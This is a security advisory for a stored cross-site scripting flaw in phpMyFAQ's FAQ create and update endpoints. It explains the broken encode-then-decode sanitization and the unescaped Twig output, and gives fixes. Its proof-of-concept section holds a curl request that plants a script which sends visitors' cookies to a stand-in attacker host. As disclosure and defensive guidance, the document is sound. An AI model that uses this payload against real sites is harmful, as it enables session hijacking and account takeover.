# [M] phpMyFAQ has Stored XSS in FAQ Question/Answer via Encode-Decode Bypass of removeAttributes() Sanitization

## Summary
Severity: Medium
Advisory: GHSA-f5p7-2c9q-8896
CVE: CVE-2026-46363
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-f5p7-2c9q-8896
Type: github-advisory

## Affected
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.2
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.2

## Details
## Summary

The FAQ creation and update endpoints in phpMyFAQ apply `FILTER_SANITIZE_SPECIAL_CHARS` (which HTML-encodes input), then immediately call `html_entity_decode()` which reverses the encoding, followed by `Filter::removeAttributes()` which only strips HTML attributes — not tags. This allows `<script>`, `<iframe>`, `<object>`, and `<embed>` tags to be stored in the database and rendered unescaped via `{{ answer|raw }}` and `{{ question|raw }}` in the Twig template, causing JavaScript execution in every visitor's browser.

## Details

**Vulnerable code path (FAQ create — `FaqController.php`):**

At line 120, the answer content is filtered:
```php
$content = Filter::filterVar($data->answer, FILTER_SANITIZE_SPECIAL_CHARS);
```

`Filter::filterVar()` calls `filterSanitizeString()` (`Filter.php:135-144`) which applies `htmlspecialchars()`, converting `<script>` to `&lt;script&gt;`. The regex `/\x00|<[^>]*>?/` then finds no literal angle brackets to strip.

At lines 150-154, the encoded content is decoded and passed to attribute-only sanitization:
```php
->setAnswer(Filter::removeAttributes(html_entity_decode(
    (string) $content,
    ENT_QUOTES | ENT_HTML5,
    encoding: 'UTF-8',
)))
```

`html_entity_decode()` converts `&lt;script&gt;` back to `<script>`, fully reversing the earlier sanitization. `Filter::removeAttributes()` (`Filter.php:150-196`) only matches and strips `attribute=value` patterns from a known list of HTML attributes (event handlers like `onclick`, `onerror`, etc.) but performs **no tag-level filtering**. A `<script>` tag with no attributes passes through completely unchanged.

The identical pattern exists in the update endpoint at lines 389-398.

**Rendering sink (`faq.twig`):**

```twig
<h2 class="mb-4 border-bottom">{{ question | raw }}</h2>
<article class="pmf-faq-body pb-4 mb-4 border-bottom">{{ answer|raw }}</article>
```

The `|raw` filter disables Twig's auto-escaping, causing the stored `<script>` tag to execute in every visitor's browser.

Additional rendering sinks exist in `search.twig` (line 75, 77) where search results also render FAQ content with `|raw`.

## PoC

**Prerequisites:** Authenticated session with `FAQ_ADD` permission and a valid CSRF token.

**Step 1: Create a malicious FAQ**
```bash
curl -X POST 'https://target/admin/api/faq/create' \
  -H 'Cookie: PHPSESSID=<admin_session>' \
  -H 'Content-Type: application/json' \
  -d '{
    "data": {
      "pmf-csrf-token": "<valid_csrf_token>",
      "question": "Harmless FAQ Title",
      "answer": "Helpful content<script>fetch(\"https://attacker.example/steal?c=\"+document.cookie)</script>",
      "categories[]": 1,
      "lang": "en",
      "tags": "",
      "active": "yes",
      "sticky": "no",
      "keywords": "test",
      "author": "Admin",
      "email": "admin@example.com",
      "comment": "n",
      "changed": "Initial",
      "notes": "",
      "serpTitle": "Harmless FAQ",
      "serpDescription": "Test",
      "openQuestionId": 0,
      "notifyEmail": "",
      "notifyUser": "",
      "recordDateHandling": "updateDate"
    }
  }'
```

**Expected response:** `200 OK` with the new FAQ ID.

**Step 2: Verify XSS execution**

Navigate to the public FAQ page (e.g., `https://target/content/1/{faqId}/en/harmless-faq-title.html`). The `<script>` tag in the answer body executes, sending the visitor's cookies to the attacker's server.

## Impact

- **Session hijacking:** An attacker with FAQ creation privileges can steal session cookies from any user (including administrators) who views the FAQ, enabling full account takeover.
- **Phishing:** The injected script can modify page content to display fake login forms or redirect users to malicious sites.
- **Worm propagation:** If the attacker captures an admin session, they can create additional malicious FAQs automatically, spreading the attack.
- **Scope:** Every unauthenticated visitor who views the compromised FAQ is affected. The XSS also fires in search results via `search.twig`.

## Recommended Fix

Replace the encode→decode→removeAttributes chain with a proper HTML sanitizer that operates on the DOM level. Use a library like [HTML Purifier](http://htmlpurifier.org/) or Symfony's [HtmlSanitizer](https://symfony.com/doc/current/html_sanitizer.html) component.

**Immediate fix — add tag-level filtering to `removeAttributes()`** (`Filter.php`):

```php
public static function removeAttributes(string $html = ''): string
{
    // Strip dangerous HTML tags entirely
    $dangerousTags = ['script', 'iframe', 'object', 'embed', 'applet', 'form', 'base', 'link', 'meta'];
    foreach ($dangerousTags as $tag) {
        $html = preg_replace('/<' . $tag . '\b[^>]*>.*?<\/' . $tag . '>/is', '', $html);
        $html = preg_replace('/<' . $tag . '\b[^>]*\/?>/is', '', $html);
    }

    // Also sanitize javascript: URIs in href/src attributes
    $html = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript:/i', '$1="', $html);

    $keep = [
        'href', 'src', 'title', 'alt', 'class', 'style', 'id',
        'name', 'size', 'dir', 'rel', 'rev', 'target', 'width',
        'height', 'controls',
    ];
    // ... rest of existing attribute removal logic
```

**Recommended long-term fix:** Replace custom sanitization with Symfony's HtmlSanitizer, which is already a project dependency ecosystem:

```php
use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

$config = (new HtmlSanitizerConfig())
    ->allowSafeElements()
    ->blockElement('script')
    ->blockElement('iframe')
    ->blockElement('object')
    ->blockElement('embed');

$sanitizer = new HtmlSanitizer($config);
$cleanAnswer = $sanitizer->sanitize($rawAnswer);
```

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-f5p7-2c9q-8896
- https://nvd.nist.gov/vuln/detail/CVE-2026-46363
- https://github.com/thorsten/phpMyFAQ
- https://www.vulncheck.com/advisories/phpmyfaq-stored-xss-in-faq-question-answer-via-encode-decode-bypass
